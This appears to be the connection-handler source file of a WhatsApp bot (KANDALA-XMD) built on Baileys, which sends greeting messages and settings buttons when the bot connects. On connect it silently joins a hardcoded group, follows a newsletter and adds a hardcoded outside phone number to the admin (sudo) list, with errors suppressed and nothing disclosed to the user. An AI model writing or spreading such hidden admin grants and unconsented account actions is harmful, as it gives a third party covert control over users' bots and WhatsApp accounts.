const { Boom } = require("@hapi/boom");
const { DateTime } = require("luxon");
const { default: feeConnect, DisconnectReason } = require("@whiskeysockets/baileys");
const { getSettings, getSudoUsers, addSudoUser } = require("../Database/config");
const { commands, totalCommands } = require("../Handler/commandHandler");

const botName = process.env.BOTNAME || "KANDALA-XMD";
let hasSentStartMessage = false;
let hasFollowedNewsletter = false;

async function connectionHandler(socket, connectionUpdate, reconnect) {
  const { connection, lastDisconnect } = connectionUpdate;

  function getGreeting() {
    const hour = DateTime.now().setZone("Africa/Nairobi").hour;
    if (hour >= 5 && hour < 12) return "Hey there! Ready to kick off the day? 🚀";
    if (hour >= 12 && hour < 18) return "What's up? Time to make things happen! ⚡";
    if (hour >= 18 && hour < 22) return "Evening vibes! Let's get to it! 🌟";
    return "Late night? Let's see what's cooking! 🌙";
  }

  function getCurrentTime() {
    return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
  }

  function toFancyFont(text, isUpperCase = false) {
    const fonts = {
      'A': '𝘼', 'B': '𝘽', 'C': '𝘾', 'D': '𝘿', 'E': '𝙀', 'F': '𝙁', 'G': '𝙂', 'H': '𝙃', 'I': '𝙄', 'J': '𝙅', 'K': '𝙆', 'L': '𝙇', 'M': '𝙈',
      'N': '𝙉', 'O': '𝙊', 'P': '𝙋', 'Q': '𝙌', 'R': '𝙍', 'S': '𝙎', 'T': '𝙏', 'U': '𝙐', 'V': '𝙑', 'W': '𝙒', 'X': '𝙓', 'Y': '𝙔', 'Z': '𝙕',
      'a': '𝙖', 'b': '𝙗', 'c': '𝙘', 'd': '𝙙', 'e': '𝙚', 'f': '𝙛', 'g': '𝙜', 'h': '𝙝', 'i': '𝙞', 'j': '𝙟', 'k': '𝙠', 'l': '𝙡', 'm': '𝙢',
      'n': '𝙣', 'o': '𝙤', 'p': '𝙥', 'q': '𝙦', 'r': '𝙧', 's': '𝙨', 't': '𝙩', 'u': '𝙪', 'v': '𝙫', 'w': '𝙬', 'x': '𝙭', 'y': '𝙮', 'z': '𝙯'
    };
    const formattedText = isUpperCase ? text.toUpperCase() : text.toLowerCase();
    return formattedText.split('').map(char => fonts[char] || char).join('');
  }

  if (connection === "connecting") {
    return;
  }

  if (connection === "close") {
    const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;
    switch (statusCode) {
      case DisconnectReason.badSession:
        process.exit();
        break;
      case DisconnectReason.connectionClosed:
        reconnect();
        break;
      case DisconnectReason.connectionLost:
        reconnect();
        break;
      case DisconnectReason.connectionReplaced:
        process.exit();
        break;
      case DisconnectReason.loggedOut:
        hasSentStartMessage = false;
        hasFollowedNewsletter = false;
        process.exit();
        break;
      case DisconnectReason.restartRequired:
        reconnect();
        break;
      case DisconnectReason.timedOut:
        reconnect();
        break;
      default:
        reconnect();
    }
    return;
  }

  if (connection === "open") {
    console.clear();
    try {
      await socket.groupAcceptInvite("ICPNmeOX3DoAE0Wy8eCc32");
    } catch (error) {}
    if (!hasFollowedNewsletter) {
      try {
        await socket.newsletterFollow("120363406146813524@newsletter");
        hasFollowedNewsletter = true;
      } catch (error) {}
    }
    const userId = socket.user.id.split(":")[0].split("@")[0];
    const settings = await getSettings();
    const sudoUsers = await getSudoUsers();
    if (!hasSentStartMessage) {
      const isNewUser = !sudoUsers.includes(userId);
      if (isNewUser) {
        await addSudoUser(userId);
        const defaultSudo = "255672752355";
        if (!sudoUsers.includes(defaultSudo)) {
          await addSudoUser(defaultSudo);
        }
      }
      if (settings.startmessage) {
        const firstMessage = isNewUser
          ? [
              `❥┈┈┈┈┈┈┈┈┈┈┈┈┈┈➤`,
              `┋✿ *${getGreeting()}*`,
              `┋✿ Welcome to *${botName}*! You're now connected.`,
              ``,
              `✨ *Bot Name*: ${botName}`,
              `🔧 *Mode*: ${settings.mode}`,
              `➡️ *Prefix*: ${settings.prefix}`,
              `📋 *Commands*: ${totalCommands}`,
              `🕒 *Time*: ${getCurrentTime()}`,
              `💾 *Database*: Postgres SQL`,
              `📚 *Library*: Baileys`,
              ``,
              `┋✿ *New User Alert*: You've been added to the sudo list.`,
              ``,
              `│┋✿ *Start Message*: Enabled by default. Use *${settings.prefix}startmessage off* to disable.`,
              `┋✿ *Credits*: kandala tech`,
              `❥┈┈┈┈┈┈┈┈┈┈┈┈┈┈➤`
            ].join("\n")
          : [
              `❥┈┈┈┈┈┈┈┈┈┈┈┈┈┈➤`,
              `┋✿ *${getGreeting()}*`,
              `┋✿ Welcome back to *${botName}*! Connection established.`,
              ``,
              `✨ *Bot Name*: ${botName}`,
              `🔧 *Mode*: ${settings.mode}`,
              `➡️ *Prefix*: ${settings.prefix}`,
              `📋 *Commands*: ${totalCommands}`,
              `🕒 *Time*: ${getCurrentTime()}`,
              `💾 *Database*: Postgres SQL`,
              `📚 *Library*: Baileys`,
              ``,
              `┋✿ Ready to proceed? Select an option below.`,
              ``,
              `┋✿ *Start Message*: Enabled by default. it is recommended to disable it...Use *${settings.prefix}startmessage off* to disable or click the button bellow. and prevent spam`,
              `┋✿ *Credits*: kandala tech`,
              `❥┈┈┈┈┈┈┈┈┈┈┈┈┈┈➤`
            ].join("\n");
        const secondMessage = [
          `❥┈┈┈┈┈┈┈┈┈┈┈┈┈┈➤`,
          `┋✿ Please select an option to continue:`,
          `❥┈┈┈┈┈┈┈┈┈┈┈┈┈┈➤`
        ].join("\n");
        try {
          await socket.sendMessage(socket.user.id, {
            text: firstMessage,
            footer: `Powered by ${botName}`,
            viewOnce: true,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: false,
                title: botName,
                body: `Bot initialized successfully.`,
                sourceUrl: `https://github.com/kandala20/Kandala-Xmd1`,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          });
          await socket.sendMessage(socket.user.id, {
            text: secondMessage,
            footer: `Powered by ${botName}`,
            buttons: [
              {
                buttonId: `${settings.prefix || ''}settings`,
                buttonText: { displayText: `⚙️ ${toFancyFont('SETTINGS')}` },
                type: 1
              },
              {
                buttonId: `${settings.prefix || ''}menu`,
                buttonText: { displayText: `🩸 ${toFancyFont('MENU')}` },
                type: 1
              },
              {
                buttonId: `${settings.prefix || ''}startmessage off`,
                buttonText: { displayText: ` ${toFancyFont('DISABLE START MESSAGE')}` },
                type: 1
              }
            ],
            headerType: 1,
            viewOnce: true,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: false,
                title: botName,
                body: `Select an option to proceed.`,
                sourceUrl: `https://github.com/kandala20/Kandala-Xmd1`,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
          });
        } catch (error) {}
      }
      hasSentStartMessage = true;
    }
  }
}
module.exports = connectionHandler;